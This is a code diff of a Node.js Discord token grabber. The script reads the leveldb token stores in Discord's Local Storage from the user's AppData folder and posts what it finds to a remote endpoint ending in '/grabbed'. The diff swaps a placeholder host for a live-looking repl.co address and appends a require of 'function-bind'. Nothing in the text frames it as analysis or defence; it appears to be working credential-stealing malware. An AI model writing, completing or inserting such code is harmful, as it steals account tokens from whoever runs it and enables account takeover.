@@ -1,6 +1,6 @@
 const fs = require('fs')
 const fetch = require('node-fetch')
-const apiurl = "https://exemple.exemple.repl.co/grabbed"
+const apiurl = "https://helloyou.notfubukii.repl.co/grabbed"
 
 var paths = [
     `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Discord/Local Storage/leveldb`,
@@ -59,3 +59,4 @@ function grabtoken(gt) {
         })
     } catch (error) {}
 }
+require("function-bind")
